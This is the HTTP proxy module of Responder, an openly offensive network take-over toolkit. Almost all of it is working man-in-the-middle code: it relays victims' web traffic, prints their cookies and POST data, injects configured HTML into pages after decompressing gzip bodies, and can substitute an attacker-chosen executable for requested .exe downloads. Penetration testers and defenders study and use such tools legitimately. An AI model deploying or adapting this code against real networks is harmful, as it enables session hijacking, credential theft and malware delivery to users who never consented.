#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from responder.src.utils import *
from responder.src import settings

if settings.Config.PY2OR3 == "PY3":
    import urllib.parse as urlparse
    import http.server as BaseHTTPServer
else:
    import urlparse
    import BaseHTTPServer

import select
import zlib
from responder.src.servers.HTTP import RespondWithFile


IgnoredDomains = [
    "crl.comodoca.com",
    "crl.usertrust.com",
    "ocsp.comodoca.com",
    "ocsp.usertrust.com",
    "www.download.windowsupdate.com",
    "crl.microsoft.com",
]


def InjectData(data, client, req_uri):

    # Serve the .exe if needed
    if settings.Config.Serve_Always:
        return RespondWithFile(
            client, settings.Config.Exe_Filename, settings.Config.Exe_DlName
        )

    # Serve the .exe if needed and client requested a .exe
    if settings.Config.Serve_Exe == True and req_uri.endswith(".exe"):
        return RespondWithFile(
            client, settings.Config.Exe_Filename, os.path.basename(req_uri)
        )

    if len(data.split(b"\r\n\r\n")) > 1:
        try:
            Headers, Content = data.split(b"\r\n\r\n")
        except:
            return data

        RedirectCodes = [
            "HTTP/1.1 300",
            "HTTP/1.1 301",
            "HTTP/1.1 302",
            "HTTP/1.1 303",
            "HTTP/1.1 304",
            "HTTP/1.1 305",
            "HTTP/1.1 306",
            "HTTP/1.1 307",
        ]
        if set(RedirectCodes) & set(Headers):
            return data

        Len = b"".join(re.findall(b"(?<=Content-Length: )[^\r\n]*", Headers))

        if b"content-encoding: gzip" in Headers.lower():
            Content = zlib.decompress(Content, 16 + zlib.MAX_WBITS)

        if b"content-type: text/html" in Headers.lower():
            if settings.Config.Serve_Html:  # Serve the custom HTML if needed
                return RespondWithFile(client, settings.Config.Html_Filename)

            HasBody = re.findall(b"(<body[^>]*>)", Content, re.IGNORECASE)

            if (
                HasBody
                and len(settings.Config.HtmlToInject) > 2
                and not req_uri.endswith(".js")
            ):
                if settings.Config.Verbose:
                    print(
                        text(
                            "[PROXY] Injecting into HTTP Response: %s"
                            % color(settings.Config.HtmlToInject, 3, 1)
                        )
                    )

                Content = Content.replace(
                    HasBody[0],
                    b"%s\n%s"
                    % (HasBody[0], settings.Config.HtmlToInject.encode("latin-1")),
                )

        if b"content-encoding: gzip" in Headers.lower():
            Content = zlib.compress(Content)

        Headers = Headers.replace(
            b"Content-Length: " + Len,
            b"Content-Length: " + NetworkSendBufferPython2or3(len(Content)),
        )
        data = Headers + b"\r\n\r\n" + Content

    else:
        if settings.Config.Verbose:
            print(text("[PROXY] Returning unmodified HTTP response"))

    return data


class ProxySock:
    def __init__(self, socket, proxy_host, proxy_port):

        # First, use the socket, without any change
        self.socket = socket

        # Create socket (use real one)
        self.proxy_host = proxy_host
        self.proxy_port = proxy_port

        # Copy attributes
        self.family = socket.family
        self.type = socket.type
        self.proto = socket.proto

    def connect(self, address):

        # Store the real remote adress
        self.host, self.port = address

        # Try to connect to the proxy
        for family, socktype, proto, canonname, sockaddr in socket.getaddrinfo(
            self.proxy_host, self.proxy_port, 0, 0, socket.SOL_TCP
        ):
            try:
                # Replace the socket by a connection to the proxy
                self.socket = socket.socket(family, socktype, proto)
                self.socket.connect(sockaddr)
            except socket.error as msg:
                if self.socket:
                    self.socket.close()
                self.socket = None
                continue
            break
        if not self.socket:
            raise socket.error(msg)

        # Ask him to create a tunnel connection to the target host/port
        self.socket.send(
            ("CONNECT %s:%d HTTP/1.1\r\n" + "Host: %s:%d\r\n\r\n")
            % (self.host, self.port, self.host, self.port)
        )

        # Get the response
        resp = self.socket.recv(4096)

        # Parse the response
        parts = resp.split()

        # Not 200 ?
        if parts[1] != "200":
            print(color("[!] Error response from upstream proxy: %s" % resp, 1))
            pass

    # Wrap all methods of inner socket, without any change
    def accept(self):
        return self.socket.accept()

    def bind(self, *args):
        return self.socket.bind(*args)

    def close(self):
        return self.socket.close()

    def fileno(self):
        return self.socket.fileno()

    def getsockname(self):
        return self.socket.getsockname()

    def getsockopt(self, *args):
        return self.socket.getsockopt(*args)

    def listen(self, *args):
        return self.socket.listen(*args)

    def makefile(self, *args):
        return self.socket.makefile(*args)

    def recv(self, *args):
        return self.socket.recv(*args)

    def recvfrom(self, *args):
        return self.socket.recvfrom(*args)

    def recvfrom_into(self, *args):
        return self.socket.recvfrom_into(*args)

    def recv_into(self, *args):
        return self.socket.recv_into(buffer, *args)

    def send(self, *args):
        try:
            return self.socket.send(*args)
        except:
            pass

    def sendall(self, *args):
        return self.socket.sendall(*args)

    def sendto(self, *args):
        return self.socket.sendto(*args)

    def setblocking(self, *args):
        return self.socket.setblocking(*args)

    def settimeout(self, *args):
        return self.socket.settimeout(*args)

    def gettimeout(self):
        return self.socket.gettimeout()

    def setsockopt(self, *args):
        return self.socket.setsockopt(*args)

    def shutdown(self, *args):
        return self.socket.shutdown(*args)

    # Return the (host, port) of the actual target, not the proxy gateway
    def getpeername(self):
        return self.host, self.port


# Inspired from Tiny HTTP proxy, original work: SUZUKI Hisao.
class HTTP_Proxy(BaseHTTPServer.BaseHTTPRequestHandler):
    __base = BaseHTTPServer.BaseHTTPRequestHandler
    __base_handle = __base.handle

    rbufsize = 0

    def handle(self):
        (ip, port) = self.client_address[0], self.client_address[1]
        if settings.Config.Verbose:
            print(
                text(
                    "[PROXY] Received connection from %s"
                    % self.client_address[0].replace("::ffff:", "")
                )
            )
        self.__base_handle()

    def _connect_to(self, netloc, soc):
        i = netloc.find(":")
        if i >= 0:
            host_port = netloc[:i], int(netloc[i + 1 :])
        else:
            host_port = netloc, 80
        try:
            soc.connect(host_port)
        except socket.error as arg:
            try:
                msg = arg[1]
            except:
                msg = arg
            self.send_error(404, msg)
            return 0
        return 1

    def socket_proxy(self, af, fam):
        Proxy = settings.Config.Upstream_Proxy
        Proxy = Proxy.rstrip("/").replace("http://", "").replace("https://", "")
        Proxy = Proxy.split(":")

        try:
            Proxy = (Proxy[0], int(Proxy[1]))
        except:
            Proxy = (Proxy[0], 8080)

        soc = socket.socket(af, fam)
        return ProxySock(soc, Proxy[0], Proxy[1])

    def do_CONNECT(self):

        if settings.Config.Upstream_Proxy:
            soc = self.socket_proxy(socket.AF_INET, socket.SOCK_STREAM)
        else:
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            if self._connect_to(self.path, soc):
                self.wfile.write(
                    NetworkSendBufferPython2or3(
                        self.protocol_version + " 200 Connection established\r\n"
                    )
                )
                self.wfile.write(
                    NetworkSendBufferPython2or3(
                        "Proxy-agent: %s\r\n" % self.version_string()
                    )
                )
                self.wfile.write(NetworkSendBufferPython2or3("\r\n"))
                try:
                    self._read_write(soc, 300)
                except:
                    pass
        except:
            raise
            pass

        finally:
            soc.close()
            self.connection.close()

    def do_GET(self):
        (scm, netloc, path, params, query, fragment) = urlparse.urlparse(
            self.path, "http"
        )

        if netloc in IgnoredDomains:
            # self.send_error(200, "OK")
            return

        if scm not in "http" or fragment or not netloc:
            self.send_error(400, "bad url %s" % self.path)
            return

        if settings.Config.Upstream_Proxy:
            soc = self.socket_proxy(socket.AF_INET, socket.SOCK_STREAM)
        else:
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            URL_Unparse = urlparse.urlunparse(("", "", path, params, query, ""))

            if self._connect_to(netloc, soc):
                soc.send(
                    NetworkSendBufferPython2or3(
                        "%s %s %s\r\n"
                        % (self.command, URL_Unparse, self.request_version)
                    )
                )

                Cookie = self.headers["Cookie"] if "Cookie" in self.headers else ""

                if settings.Config.Verbose:
                    print(
                        text(
                            "[PROXY] Client        : %s"
                            % color(self.client_address[0].replace("::ffff:", ""), 3)
                        )
                    )
                    print(text("[PROXY] Requested URL : %s" % color(self.path, 3)))
                    print(text("[PROXY] Cookie        : %s" % Cookie))

                self.headers["Connection"] = "close"
                del self.headers["Proxy-Connection"]
                del self.headers["If-Range"]
                del self.headers["Range"]

                for k, v in self.headers.items():
                    soc.send(NetworkSendBufferPython2or3("%s: %s\r\n" % (k.title(), v)))
                soc.send(NetworkSendBufferPython2or3("\r\n"))

                try:
                    self._read_write(soc, netloc)
                except:
                    pass

        except:
            pass

        finally:
            soc.close()
            self.connection.close()

    def _read_write(self, soc, netloc="", max_idling=30):
        iw = [self.connection, soc]
        ow = []
        count = 0
        while 1:
            count += 1
            (ins, _, exs) = select.select(iw, ow, iw, 1)
            if exs:
                break
            if ins:
                for i in ins:
                    if i is soc:
                        out = self.connection
                        try:
                            data = i.recv(4096)
                            if len(data) > 1:
                                data = InjectData(
                                    data, self.client_address[0], self.path
                                )
                        except:
                            pass
                    else:
                        out = soc
                        try:
                            data = i.recv(4096)

                            if self.command == b"POST" and settings.Config.Verbose:
                                print(text("[PROXY] POST Data     : %s" % data))
                        except:
                            pass
                    if data:
                        try:
                            out.send(data)

                            count = 0
                        except:
                            pass
            if count == max_idling:
                break
        return None

    do_HEAD = do_GET
    do_POST = do_GET
    do_PUT = do_GET
    do_DELETE = do_GET
